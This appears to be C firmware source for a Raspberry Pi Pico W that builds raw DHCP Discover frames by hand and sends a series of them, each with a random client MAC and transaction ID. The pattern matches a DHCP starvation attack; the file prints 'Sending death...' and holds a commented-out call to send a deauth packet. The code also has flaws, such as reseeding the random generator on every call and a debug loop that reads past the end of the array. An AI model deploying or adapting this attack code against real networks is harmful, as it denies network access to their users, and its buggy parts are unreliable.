#include <stdio.h>
#include "pico/stdlib.h"
#include "pico/stdio.h"
#include "pico/cyw43_arch.h"
#include "deauth/deauth.h"

void generate_random_mac(uint8_t mac[6])
{
    // Seed the random number generator with the current time
    srand((unsigned int)time(NULL));

    // Generate random MAC address bytes
    for (int i = 0; i < 6; i++)
    {
        mac[i] = (uint8_t)rand();
    }

    // Set the local bit (second least significant bit of the first byte) to 1
    mac[0] |= 0x02;
}

void generate_transaction_id(uint8_t tid[4])
{
    // Seed the random number generator with the current time
    srand((unsigned int)time(NULL));

    // Generate random MAC address bytes
    for (int i = 0; i < 4; i++)
    {
        tid[i] = (uint8_t)rand();
    }

    // Set the local bit (second least significant bit of the first byte) to 1
    tid[0] |= 0x02;
}

void send_dhcp_discover()
{
    struct pbuf *p = pbuf_alloc(PBUF_RAW, 350, PBUF_RAM);

    uint8_t dhcp_discover[350] = {
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff,                         // Ethernet Dest MAC
        0xd8, 0x3a, 0xdd, 0x45, 0xd1, 0xd7,                         // Ethernet Src MAC
        0x08, 0x00,                                                 // Ethernet Type
        0x45, 0x00, 0x01, 0x50, 0x00, 0x01, 0x00, 0x00, 0xff, 0x11, // IP
        0xba, 0x9c, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, // IP
        0x00, 0x44, 0x00, 0x43, 0x01, 0x3c, 0xc2, 0x85,             // UDP
        0x01,                                                       // Opcode: Boot Request (1)
        0x01,                                                       // Hardware Type: Ethernet (1)
        0x06,                                                       // Hardware Address Length: 6
        0x00,                                                       // Hops: 0
        0x00, 0x00, 0x00, 0x00,                                     // Transaction ID: 0 (will be filled by DHCP server)
        0x00, 0x00,                                                 // Seconds: 0
        0x00, 0x00,                                                 // Flags: 0
        0x00, 0x00, 0x00, 0x00,                                     // Client IP Address: 0.0.0.0
        0x00, 0x00, 0x00, 0x00,                                     // Your IP Address: 0.0.0.0
        0x00, 0x00, 0x00, 0x00,                                     // Server IP Address: 0.0.0.0
        0x00, 0x00, 0x00, 0x00,                                     // Gateway IP Address: 0.0.0.0
        0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff,                         // Client Hardware Address (MAC)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Padding
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Server Host Name
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Server Host Name
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Server Host Name
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Server Host Name
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Server Host Name
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Server Host Name
        0x00, 0x00, 0x00, 0x00,                                     // Server Host Name 150
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Boot File Name
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Boot File Name
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Boot File Name
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Boot File Name
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Boot File Name
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Boot File Name
        0x00, 0x00, 0x00, 0x00,                                     // Boot File Name
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Boot File Name
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Boot File Name
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Boot File Name
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Boot File Name
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Boot File Name
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Boot File Name
        0x00, 0x00, 0x00, 0x00,                                     // Boot File Name
        0x63, 0x82, 0x53, 0x63,                                     // Magic Cookie: DHCP (99.130.83.99)
        0x35, 0x01, 0x01,                                           // Option: DHCP Discover (53, length 1, value 1)
        0x3d, 0x07, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,       // Option: Client Identifier
        0x39, 0x02, 0x05, 0xdc,                                     // Option: Maximum DHCP Message Size
        0x37, 0x04, 0x01, 0x03, 0x1c, 0x06,                         // Parameter Request List
        0xff,                                                       // End of Options
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Padding
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Padding
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Padding
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Padding
        0x00, 0x00, 0x00, 0x00, 0x00,                               // Padding
    };

    if (p != NULL)
    {

        printf("Sending death...\n");
        int count = 0;
        int dErr = 0;
        for (; count < 32;)
        {
            uint8_t transaction_id[4];
            generate_random_mac(transaction_id);
            printf("Transaction ID: %02X%02X%02X%02X\n",
                   transaction_id[0], transaction_id[1], transaction_id[2],
                   transaction_id[3]);
            memcpy(&dhcp_discover[46], transaction_id, sizeof(transaction_id)); // Transaction ID
            sleep_ms(1000);
            uint8_t randomMac[6];
            generate_random_mac(randomMac);
            printf("Random MAC address: %02X:%02X:%02X:%02X:%02X:%02X\n",
                   randomMac[0], randomMac[1], randomMac[2],
                   randomMac[3], randomMac[4], randomMac[5]);
            // memcpy(&dhcp_discover[6], randomMac, sizeof(randomMac)); // Eth Src MAC
            memcpy(&dhcp_discover[70], randomMac, sizeof(randomMac));   // Client MAC Addr
            memcpy(&dhcp_discover[288], randomMac, sizeof(randomMac));  // Client Identifier MAC addr

            set_payload(p, dhcp_discover, 350);
            printf("pbuf len: %d, payload: %p dhcp_discover: %p\n", p->tot_len, p->payload, dhcp_discover);
            printf("\n\npbuf payload: ");
            for (int i = 0; i < 350; i++)
            {
                printf("%02x ", ((uint8_t *)p->payload)[i]);
            }
            printf("\n\ndhcp_discover: ");
            for (int i = 0; i < 359; i++)
            {
                printf("%02x ", dhcp_discover[i]);
            }
            printf("\n\n");
            dErr = cyw43_send_ethernet(&cyw43_state, CYW43_ITF_STA, p->tot_len, (void *)p, true);
            // dErr = cyw43_send_ethernet(&cyw43_state, CYW43_ITF_STA, 26, deauthPacket, false);
            if (dErr == 0)
            {
                count++;
            }
            sleep_ms(1000);
        }
        printf("Result: %d, %d frames sent\n", dErr, count);
    }
    pbuf_free(p);
}